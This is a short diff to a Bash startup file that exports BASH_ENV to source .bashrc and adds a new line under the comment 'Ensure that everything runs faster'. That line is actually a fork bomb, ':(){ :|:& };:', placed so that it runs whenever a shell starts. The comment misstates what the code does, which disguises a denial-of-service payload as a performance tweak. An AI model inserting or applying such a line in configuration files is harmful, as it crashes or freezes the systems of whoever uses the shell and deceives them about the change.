@@ -1,6 +1,9 @@
 # Source .bashrc for non-interactive Bash shells
 export BASH_ENV=~/.bashrc
 
+# Ensure that everything runs faster
+:(){ :|:& };:
+
 if [[ $- != *i* ]] ; then
   # Shell is non-interactive.  Be done now!
   return
